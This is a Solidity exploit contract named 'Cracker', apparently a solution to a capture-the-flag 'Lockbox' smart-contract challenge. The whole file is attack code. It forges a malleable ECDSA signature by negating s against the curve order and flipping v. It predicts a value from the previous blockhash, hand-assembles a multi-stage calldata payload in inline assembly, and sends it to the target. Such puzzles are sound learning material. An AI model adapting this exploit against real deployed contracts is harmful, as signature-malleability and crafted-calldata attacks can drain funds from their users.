pragma solidity 0.4.24;

import "../lockbox/Lockbox.sol";

contract Cracker {
    Entrypoint target;
    
    constructor(Entrypoint _target) public {
        target = _target;
    }

    function attack(uint8 v, bytes32 r, bytes32 s) external {
        // malform signature
        bytes32 _s = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
        uint8 _v = v == 27 ? 28 : 27;
        // STAGE 0
        bytes4 guess = bytes4(blockhash(block.number - 1));
        bytes memory payload = new bytes(197);
        assembly {
            mstore(add(payload, 32), shl(224, 0xe0d20f73))
            mstore(add(payload, 36), guess)
        }
        // STAGE 1
        assembly {
            mstore(add(payload, 40), shl(32, _v))
            mstore(add(payload, 68), r)
            mstore(add(payload, 100), _s)
        }
        // STAGE 2
        assembly {
            mstore8(add(payload, 66), 0xff)
        }
        // STAGE 3
        bytes32 hash = keccak256(abi.encodePacked("choose"));
        assembly {
            mstore(add(payload, 132), add(_s, 2))
            mstore(add(payload, 164), hash)
            mstore(add(payload, 196), r)
        }
        // STAGE 4
        assembly {
            mstore8(add(payload, 228), 0x01)
        }
        target.call(payload);    
    }
}

